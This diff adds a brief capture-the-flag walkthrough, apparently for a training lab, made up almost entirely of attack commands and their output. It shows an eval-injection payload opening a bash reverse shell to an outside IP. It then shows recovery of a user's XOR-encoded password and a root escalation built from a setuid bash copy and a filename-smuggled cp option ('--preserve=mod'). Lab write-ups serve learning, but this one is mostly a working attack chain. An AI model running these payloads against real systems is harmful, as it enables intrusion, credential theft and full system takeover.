@@ -1,0 +1,76 @@
+port 5000 is open, download the source code.
+
+find eval function.  //set reversehll code in to the field with #
+
+__import__('os').system("bash -c 'bash -i >& /dev/tcp/10.11.140.117/8821  0>&1'")#
+
+bruce@ip-10-10-150-229:~$ cat /etc/passwd | grep bash
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+bruce:x:1000:1000:bruce:/home/bruce:/bin/bash
+gordon:x:1001:1001::/home/gordon:/bin/bash
+ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
+
+bruce@ip-10-10-150-229:/home/gordon$ ls -la
+ls -la
+total 32
+drwxr-xr-x 4 gordon gordon 4096 Aug  2  2022 .
+drwxr-xr-x 5 root   root   4096 Aug  1 06:02 ..
+drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 backups
+lrwxrwxrwx 1 root   root      9 May 13  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 gordon gordon  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 gordon gordon 3771 Feb 25  2020 .bashrc
+-rw-r----- 1 root   gordon   21 Aug  2  2022 flag2.txt
+-rw-r--r-- 1 gordon gordon  807 Feb 25  2020 .profile
+drwxrwx--- 2 gordon gordon 4096 Feb 19  2023 reports
+-rw------- 1 gordon gordon    0 May 12  2022 .viminfo
+
+bruce@ip-10-10-150-229:~$ cat note
+cat note
+Hello Bruce,
+
+I have encoded my password using the super secure XOR format.
+
+I made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.
+
+For now look at this super secure string:
+NEUEDTIeN1MRDg5K
+
+Gordon
+
+bruce@ip-10-10-150-229:~$ sudo -u gordon /usr/bin/python3 /opt/encrypt.py
+sudo -u gordon /usr/bin/python3 /opt/encrypt.py
+Enter a password to encrypt: NEUEDTIeN1MRDg5K
+PTAlIDYnLAY8VDk5IR5NJA==
+
+key : supersecretkeyxor
+
+G0th@mR0ckz!   //passwd of gordon
+
+gordon@ip-10-10-150-229:~$ find / -user root -group gordon -ls 2>/dev/null
+   403597      4 -rw-r-----   1 root     gordon        485 Aug  2  2022 /opt/encrypt.py
+    12272      4 -rwxr-----   1 root     gordon         66 May 12  2022 /usr/bin/backup
+   403598      4 -rw-r-----   1 root     gordon         21 Aug  2  2022 /home/gordon/flag2.txt
+
+gordon@ip-10-10-150-229:~$ cat /usr/bin/backup
+#!/bin/bash
+
+cd /home/gordon/reports/
+
+cp * /home/gordon/backups/
+
+gordon@ip-10-10-37-15:~/reports$ cp /bin/bash .
+gordon@ip-10-10-37-15:~/reports$ chmod +sx bash
+gordon@ip-10-10-37-15:~/reports$ ls
+bash  report1  report2  report3
+gordon@ip-10-10-37-15:~/reports$ echo "" > "--preserve=mod"
+gordon@ip-10-10-37-15:~/reports$ ls
+'--preserve=mod'   bash   report1   report2   report3
+gordon@ip-10-10-37-15:~/reports$ cd ..
+gordon@ip-10-10-37-15:~$ ls backups/
+bash  report1  report2  report3
+gordon@ip-10-10-37-15:~$ cd backups/
+gordon@ip-10-10-37-15:~/backups$ ./bash -p
+bash-5.0# id
+uid=1001(gordon) gid=1001(gordon) euid=0(root) egid=0(root) groups=0(root),1001(gordon)
+
